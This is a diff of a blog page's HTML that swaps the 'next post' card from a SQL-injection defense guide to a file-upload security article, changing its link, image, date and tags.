@@ -1084,13 +1167,13 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/08/03/2026-08-03-sql-injection-guide/">
+                <a href="/2026/08/06/2026-08-06-file-upload-security/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="SQL 注入原理与防御指南">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="文件上传安全：原理、攻击与防御">
                         
-                        <span class="card-title">SQL 注入原理与防御指南</span>
+                        <span class="card-title">文件上传安全：原理、攻击与防御</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1101,7 +1184,7 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-06
                             </span>
                         <span class="publish-author">
                             
@@ -1114,8 +1197,16 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件上传</span>
+                    </a>
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
                     </a>
                     
                 </div>
